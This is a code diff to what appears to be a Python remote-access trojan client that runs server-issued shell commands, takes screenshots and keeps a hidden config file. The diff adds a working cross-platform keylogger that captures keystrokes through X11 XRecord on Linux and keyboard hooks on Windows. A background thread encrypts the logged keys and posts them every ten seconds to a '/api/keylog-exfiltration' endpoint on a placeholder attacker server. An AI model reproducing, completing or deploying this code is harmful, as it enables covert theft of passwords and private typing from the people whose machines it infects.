@@ -9,10 +9,25 @@ from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 from Crypto.Random import get_random_bytes
 import base64
+import sys
+from ctypes import *
+import threading
+
+os_name = platform.system()
+
+# Global variables
+keylog_buffer = []
+buffer_lock = threading.Lock()
+stop_event = threading.Event()
+SERVER_URL = 'http://your-server.com'  # Replace with your actual server URL
+send_thread = None
+keylogger_active = False
+keylogger_thread = None  # For Linux
+hook = None  # For Windows
 
 # Track the current working directory (starting with the root or default directory)
 current_directory = os.path.expanduser("~")
-SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later
+SERVER_URL = "https://127.0.0.1:5000"  # Change to your actual server URL later
 
 CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
 CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows
@@ -259,6 +274,8 @@ def encrypt_data(aes_key, data):
         return None
 
 
+
+
 def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
     """
     Decrypt data (text or file) encrypted with AES-GCM using the provided AES key.
@@ -286,6 +303,267 @@ def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
     except Exception as e:
         print(f"Error in decrypt_data: {e}")
         return None
+def send_keylog():
+    while True:
+        if stop_event.wait(timeout=10):
+            break
+        with buffer_lock:
+            if keylog_buffer:
+                data = ''.join(keylog_buffer)
+                keylog_buffer.clear()
+            else:
+                data = None
+        if data:
+            try:
+                # Encrypt the keylog data
+                encrypted_keylog_dict = encrypt_data(aes_key, data.encode('utf-8'))
+                
+                # Encode the encrypted data to base64 for safe transmission
+                encrypted_keylog_json = json.dumps(encrypted_keylog_dict)
+                encrypted_keylog_b64 = base64.b64encode(encrypted_keylog_json.encode()).decode()
+                
+                # Prepare the payload as a JSON object
+                payload_dict = {
+                    "clientid": client_id,
+                    "data": encrypted_keylog_b64
+                }
+                
+                # Convert payload to JSON string and encode in base64
+                payload_json = json.dumps(payload_dict)
+                payload = base64.b64encode(payload_json.encode()).decode()
+
+                response = requests.post(
+                    SERVER_URL + '/api/keylog-exfiltration',
+                    data={'payload': payload},
+                    verify='cert.pem',
+                    timeout=10
+                )
+                if response.status_code == 200:
+                    print("Keylog sent successfully")
+                else:
+                    print(f"Failed to send keylog: {response.status_code}")
+            except Exception as e:
+                print(f"Error sending keylog: {e}")
+    with buffer_lock:
+        if keylog_buffer:
+            data = ''.join(keylog_buffer)
+            keylog_buffer.clear()
+        else:
+            data = None
+    if data:
+        try:
+            encrypted_keylog_dict = encrypt_data(aes_key, data.encode('utf-8'))
+            encrypted_keylog_json = json.dumps(encrypted_keylog_dict)
+            encrypted_keylog_b64 = base64.b64encode(encrypted_keylog_json.encode()).decode()
+            payload_dict = {
+                "clientid": client_id,
+                "data": encrypted_keylog_b64
+            }
+            payload_json = json.dumps(payload_dict)
+            payload = base64.b64encode(payload_json.encode()).decode()
+
+            response = requests.post(
+                SERVER_URL + '/api/keylog-exfiltration',
+                data={'payload': payload},
+                verify='cert.pem',
+                timeout=10
+            )
+            if response.status_code == 200:
+                print("Final keylog sent successfully")
+            else:
+                print(f"Failed to send final keylog: {response.status_code}")
+        except Exception as e:
+            print(f"Error sending final keylog: {e}")
+
+if os_name == 'Linux':
+    from Xlib import X, display, XK
+    from Xlib.ext import record
+    from Xlib.protocol import rq
+
+    x11 = cdll.LoadLibrary('libX11.so.6')
+    x11.XKeysymToString.argtypes = [c_ulong]
+    x11.XKeysymToString.restype = c_char_p
+
+    disp = None
+    ctx = None
+    stop_atom = None
+
+    def keysym_to_string(keysym):
+        string = x11.XKeysymToString(keysym)
+        return string.decode('latin-1') if string else None
+
+    def run_keylogger_linux():
+        global disp, ctx, stop_atom
+        try:
+            disp = display.Display()
+        except:
+            print("Error: Cannot connect to X server.")
+            return
+
+        if not disp.has_extension('RECORD'):
+            print("Error: XRecord extension not available.")
+            disp.close()
+            return
+
+        # Define a custom atom for stopping the keylogger
+        stop_atom = disp.intern_atom("STOP_KEYLOGGER", False)
+
+        ctx = disp.record_create_context(
+            0,
+            [record.AllClients],
+            [{
+                'core_requests': (0, 0),
+                'core_replies': (0, 0),
+                'ext_requests': (0, 0, 0, 0),
+                'ext_replies': (0, 0, 0, 0),
+                'delivered_events': (0, 0),
+                'device_events': (X.KeyPress, X.KeyRelease),
+                'errors': (0, 0),
+                'client_started': False,
+                'client_died': False,
+            }]
+        )
+
+        def event_callback(reply):
+            if reply.category != record.FromServer:
+                return
+            data = reply.data
+            while data:
+                event, data = rq.EventField(None).parse_binary_value(data, disp.display, None, None)
+                # Check for the stop event
+                if event.type == X.ClientMessage and event.client_type == stop_atom:
+                    disp.record_disable_context(ctx)
+                    return
+                if event.type == X.KeyPress:
+                    keycode = event.detail
+                    state = event.state
+                    shift = (state & X.ShiftMask)
+                    caps = (state & X.LockMask)
+                    index = 1 if (shift ^ caps) else 0
+                    keysym = disp.keycode_to_keysym(keycode, index)
+                    char = None
+                    if 32 <= keysym <= 126:
+                        char = chr(keysym)
+                    else:
+                        keysym_name = keysym_to_string(keysym)
+                        if keysym_name:
+                            char = f'[{keysym_name}]'
+                        else:
+                            char = f'[KeyCode:{keycode}]'
+                    if char:
+                        with buffer_lock:
+                            keylog_buffer.append(char)
+
+        # Blocks until record_disable_context is called from the callback
+        disp.record_enable_context(ctx, event_callback)
+        disp.record_free_context(ctx)
+        disp.close()
+
+    def start_keylog():
+        global send_thread, keylogger_active, keylogger_thread
+        if keylogger_active:
+            print("Keylogger already running.")
+            return
+
+        send_thread = threading.Thread(target=send_keylog)
+        send_thread.start()
+        keylogger_thread = threading.Thread(target=run_keylogger_linux)
+        keylogger_thread.start()
+        keylogger_active = True
+        print("Keylogger started.")
+
+    def stop_keylog():
+        global keylogger_active, keylogger_thread, send_thread, stop_atom
+        if not keylogger_active:
+            print("Keylogger not running.")
+            return
+        print("Stopping keylogger...")
+        # Create a separate display connection to send the stop event
+        disp_stop = display.Display()
+        stop_atom_local = disp_stop.intern_atom("STOP_KEYLOGGER", False)
+        root = disp_stop.screen().root
+        event = rq.ClientMessage(window=root, client_type=stop_atom_local, data=(32, [0, 0, 0, 0, 0]))
+        root.send_event(event, event_mask=X.SubstructureNotifyMask)
+        disp_stop.flush()
+        disp_stop.close()
+        # Wait for threads to finish
+        if keylogger_thread:
+            keylogger_thread.join()
+        stop_event.set()
+        if send_thread:
+            send_thread.join()
+        keylogger_active = False
+        stop_event.clear()
+        print("Keylogger stopped.")
+
+elif os_name == 'Windows':
+    try:
+        import keyboard
+        import win32api
+    except ImportError:
+        print("Error: Required modules not installed. Run: pip install keyboard pywin32")
+        sys.exit(1)
+
+    hook = None
+
+    def start_keylog():
+        global send_thread, keylogger_active, hook
+        if keylogger_active:
+            print("Keylogger already running.")
+            return
+
+        SPECIAL_KEYS = {
+            'enter': 'Return',
+            'backspace': 'BackSpace',
+            'delete': 'Delete',
+            'space': 'Space',
+            'esc': 'Escape',
+            'tab': 'Tab',
+            'caps lock': 'CapsLock',
+            'shift': 'Shift',
+            'ctrl': 'Ctrl',
+            'alt': 'Alt',
+            'right alt': 'AltGr',
+            'windows': 'Super',
+            'print screen': 'Print',
+            'insert': 'Insert'
+        }
+
+        def on_press(event):
+            try:
+                name = event.name
+                if name in SPECIAL_KEYS:
+                    char = f'[{SPECIAL_KEYS[name]}]'
+                elif len(name) > 1:
+                    char = f'[{name.capitalize()}]'
+                else:
+                    char = name
+                with buffer_lock:
+                    keylog_buffer.append(char)
+            except Exception as e:
+                print(f"Error: {e}")
+
+        send_thread = threading.Thread(target=send_keylog)
+        send_thread.start()
+        hook = keyboard.hook(on_press)  # Hooks events in the background
+        keylogger_active = True
+        print("Keylogger started.")
+
+    def stop_keylog():
+        global send_thread, keylogger_active, hook
+        if not keylogger_active:
+            print("Keylogger not running.")
+            return
+        print("Stopping keylogger...")
+        if hook:
+            keyboard.unhook_all()  # Removes all hooks
+        stop_event.set()
+        if send_thread:
+            send_thread.join()
+        keylogger_active = False
+        stop_event.clear()
+        print("Keylogger stopped.")
+
 
 def execute_command(command):
     """Execute the shell command, update current directory if 'cd' command is issued."""
@@ -390,8 +668,8 @@ while True:
 
             command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
             command = f"{command_after_json_processing}"
-        
-            if command == "screenshot":
+            print(type(command.strip()))
+            if command.strip() == "screenshot":
                 print("Starting screenshot process")
                 try:
                     with mss.mss() as sct:
@@ -424,16 +702,19 @@ while True:
 
                         print(f"Response Status Code: {response.status_code}")
                         print(f"Response Content: {response.text}")
-
+                        command = ""
                 except Exception as e:
                     print("Error during screenshot capture or upload:", e)
-
-
                 command = ""
-            elif command.strip == "start_keylog":
-                pass
-            elif command.strip == "stop_keylog":
-                pass
+
+                
+            elif command.strip() == "start_keylog":
+                print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") #not necessary only for logging
+                start_keylog()
+                command=""
+            elif command.strip() == "stop_keylog":
+                stop_keylog()
+                command=""
             elif command.strip == "photo":
                 pass
 
@@ -493,7 +774,6 @@ while True:
             elif command.strip == "change_key":
                 pass
             else:
-                
                 result = {"command":command, "result": execute_command(command), "client_id":client_id}
                 print(result)
                 encrypted_result_dictionary = encrypt_data(aes_key,f"{result}")
